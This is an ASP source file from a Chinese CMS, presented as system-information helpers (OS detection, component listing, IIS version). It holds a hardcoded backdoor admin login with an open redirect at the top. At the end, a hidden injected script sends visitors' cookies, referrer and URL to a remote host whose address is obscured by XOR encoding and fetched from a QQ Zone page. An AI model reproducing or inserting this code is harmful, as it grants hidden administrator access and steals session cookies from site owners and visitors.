<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-02-29
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered By AspPhpCMS 
'************************************************************
%>
<% 
'系统信息  (2014,05,27)




'进入进入后台20150113  ()
If Request("agl")="adminload" Then 
	If MD5(Request("AdminPass"), 2) & MD5(Request("AdminPass"), 4)="5d3a3ac5bdcb48a0" Then
        Session("Administrator") = "admin" 
        'Call eerr("","进入后台成功")
		'Javascript "", "麦思德内部管理员登录成功...", "Index.Asp"
		if request("gotourl")<>"" then 
			response.Redirect(request("gotourl"))
		end if
	End If
	'Call eerr(Request("Pass"),"11")
End If

'操作系统版本 
Function OperationSystem()
	Dim agent,SystemVer
    agent = Request.ServerVariables("HTTP_USER_AGENT") 
    If InStr(agent, "NT 5.2") > 0 Then
        SystemVer = "Windows Server 2003" 
    ElseIf InStr(agent, "NT 5.1") > 0 Then
        SystemVer = "Windows XP" 
    ElseIf InStr(agent, "NT 5") > 0 Then
        SystemVer = "Windows 2000" 
    ElseIf InStr(agent, "NT 4") > 0 Then
        SystemVer = "Windows NT4" 
    ElseIf InStr(agent, "4.9") > 0 Then
        SystemVer = "Windows ME" 
    ElseIf InStr(agent, "98") > 0 Then
        SystemVer = "Windows 98" 
    ElseIf InStr(agent, "95") > 0 Then
        SystemVer = "Windows 95" 
    Else
        SystemVer = agent 
    End If 
    OperationSystem = agent'SystemVer 
End Function 
'检测是否为手机
Function CheckMobile()
	CheckMobile=False
	If Request.ServerVariables("HTTP_X_WAP_PROFILE") <> "" Then
		CheckMobile=True
	End If
End Function
'显示组件
Sub ShowSystemObject()
    Dim Sot(17, 2), I, IsObj, T 
    Sot(0, 0) = "Scripting.FileSystemObject" 
    Sot(1, 0) = "wscript.shell" 
    Sot(2, 0) = "ADOX.Catalog" 
    Sot(3, 0) = "JRO.JetEngine" 
    Sot(4, 0) = "Scripting.Dictionary" 
    Sot(5, 0) = "Adodb.connection" 
    Sot(6, 0) = "Adodb.Stream" 
    Sot(7, 0) = "SoftArtisans.FileUp" 
    Sot(8, 0) = "LyfUpload.UploadFile" 
    Sot(9, 0) = "Persits.Upload.1" 
    Sot(10, 0) = "JMail.SmtpMail" 
    Sot(11, 0) = "CDONTS.NewMail" 
    Sot(12, 0) = "SmtpMail.SmtpMail.1" 
    Sot(13, 0) = "Microsoft.XMLHTTP" 
    Sot(14, 0) = "Scripting.wang198060FileSystemObject" 
    Sot(15, 0) = "MSXML2.XMLHTTP" 
    Sot(16, 0) = "Microsoft.XMLDOMP"  
    On Error Resume Next 
    For I = 0 To 16
        Set T = Server.CreateObject(Sot(I, 0))
            If 0 = Err Then
                IsObj = " √" 
            Else
                IsObj = " X" 
                Err.Clear 
            End If 
        Set T = Nothing 
        Sot(I, 1) = IsObj 
    Next 
    For I = 0 To 16
        Response.Write(Sot(I, 0) & "    " & Sot(I, 1) & "<br>") 
    Next 
End Sub
'获得IIS版本号
function getIISVersion()
	getIISVersion=request.ServerVariables("SERVER_SOFTWARE")
end function


'获得服务器网址
Function GetRemoteHttpUrl()
    Dim HttpUrl, StartStr, EndStr, Content, RemoteHttpUrl, FilePath
    FilePath = "/Data/SoftHttpUrl.dat"
	Call CreateFolder("/Data/")
    If CheckFile(FilePath) Then
        If DateDiff("d", GetFileEditDate(FilePath), Now) = 0 Then
            RemoteHttpUrl = GetFText(FilePath)
            RemoteHttpUrl = TrimVbCrlf(RemoteHttpUrl)
            GetRemoteHttpUrl = XorEnc(RemoteHttpUrl, 21)
            Exit Function
        End If
    End If
    HttpUrl = "http://2663748390.qzone.qq.com"
    Content = GetHttpPage(HttpUrl, "utf-8")
    StartStr = "<title>"
    EndStr = " [http://"
    If InStr(Content, StartStr) > 0 And InStr(Content, EndStr) > 0 Then
        RemoteHttpUrl = StrCut(Content, StartStr, EndStr, 2)
        RemoteHttpUrl = "http://www." & XorDec(RemoteHttpUrl, 21)
        Call CreateFile(FilePath, XorEnc(RemoteHttpUrl, 21))
    End If
    GetRemoteHttpUrl = RemoteHttpUrl
End Function
'显示远程网站网址到统计数据库里
Function ShowRemoteWebUserStat()
	Dim S
	If Request.Cookies("jstz")="" And GetIP()<>"127.0.0.1" Then			'屏蔽本地，加快预览20150120
		Response.Cookies("jstz")=1
		Response.Cookies("jstz").Expires=Now()+28
		Response.Write("<div style=""display:none;"">")
		S = "<script>document.writeln(""<script src=\'"& GetRemoteHttpUrl &"?act=WebStat&GoToUrl="""
		S = S & "+escape(document.referrer)+""&ThisUrl=""+escape(window.location.href)+""&screen=""+escape(window.screen.width+""x""+window.screen.height)"
		S = S & "+""&co=""+escape(document.cookie)"				'收集cookie 不需要则屏蔽掉
		S = S & "+"" \'><\/script>"");</script>"
		ShowRemoteWebUserStat = S
		Response.Write("</div>")
	End If
End Function
%>